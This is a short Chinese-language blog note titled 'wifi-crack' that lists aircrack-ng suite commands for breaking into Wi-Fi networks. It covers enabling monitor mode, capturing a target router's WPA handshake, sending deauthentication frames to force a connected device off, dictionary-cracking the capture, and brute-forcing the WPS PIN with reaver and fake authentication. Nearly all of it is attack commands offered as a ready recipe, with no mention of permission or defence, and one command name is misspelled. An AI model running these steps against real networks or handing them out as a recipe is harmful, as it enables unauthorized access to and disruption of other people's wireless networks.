---
title: wifi-crack
date: 2020-06-27 07:33:06
layout:
updated:
comments:
categories:
tags:
---
1. 使用airmon-ng命令检查网卡是否支持监听模式

`airmon-ng`

2. 开启无线网卡的监听模式

`airmon-ng start IFACE`

3. 扫描环境中的WiFi网络

`airodump IFACE`

4. 抓取握手包

`airodump-ng -c TARGET_CHANNEL --bssid TARGET_MAC -w CAP_FILE IFACE `

```
-c 指定信道，上面已经标记目标热点的信道

-bssid指定目标路由器的BSSID，就是上面标记的BSSID

-w指定抓取的数据包保存的目录
```

5. 对无线路由器进行Deauth攻击

`aireplay-ng --deauth 1 -a TARGET_MAC -c DEVICE_MAC IFACE`

6. 进行破解WIFI密码（跑包）

`aircrack-ng -w WORDLIST CAP_FILE`





7. pin破解


wash -i IFACE

reaver --bssid TARGET_MAC --channel TARGET_CHANNEL -i IFACE -A -v --no-nack

aireplay-ng --fakeauth 100 -a TARGET_MAC -h IFACE_MAC IFACE

